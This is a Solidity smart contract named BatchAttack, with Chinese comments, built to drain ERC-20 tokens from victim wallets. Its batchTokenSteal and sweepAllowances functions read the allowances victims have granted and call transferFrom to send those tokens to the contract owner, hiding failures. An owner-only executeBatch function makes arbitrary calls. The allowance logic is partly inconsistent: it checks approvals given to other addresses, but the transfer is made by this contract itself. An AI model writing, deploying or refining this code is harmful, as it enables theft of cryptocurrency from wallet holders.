// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title BatchAttack
 * @notice 批量攻击执行器
 * @dev 一次交易执行多个攻击向量
 */
contract BatchAttack {
    address public owner;

    struct AttackCall {
        address target;
        uint256 value;
        bytes data;
    }

    event BatchExecuted(uint256 calls, uint256 totalGas);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 批量执行任意调用
     */
    function executeBatch(AttackCall[] calldata calls) external onlyOwner {
        uint256 startGas = gasleft();

        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            // 即使单个失败也继续
            if (!success) {
                emit BatchExecuted(i + 1, startGas - gasleft());
            }
        }

        emit BatchExecuted(calls.length, startGas - gasleft());
    }

    /**
     * @notice 批量窃取多个代币
     */
    function batchTokenSteal(
        address[] calldata tokens,
        address[] calldata victims,
        address[] calldata traps
    ) external onlyOwner {
        for (uint256 i = 0; i < victims.length; i++) {
            for (uint256 j = 0; j < tokens.length; j++) {
                try IERC20(tokens[j]).transferFrom(
                    victims[i], 
                    owner, 
                    IERC20(tokens[j]).allowance(victims[i], traps[j])
                ) {} catch {}
            }
        }
    }

    /**
     * @notice 批量检查授权并窃取
     */
    function sweepAllowances(
        address token,
        address[] calldata users,
        address[] calldata spenders
    ) external onlyOwner returns (uint256 totalStolen) {
        for (uint256 i = 0; i < users.length; i++) {
            uint256 allowance = IERC20(token).allowance(users[i], spenders[i]);
            if (allowance > 0) {
                try IERC20(token).transferFrom(users[i], owner, allowance) {
                    totalStolen += allowance;
                } catch {}
            }
        }
    }

    receive() external payable {}
}
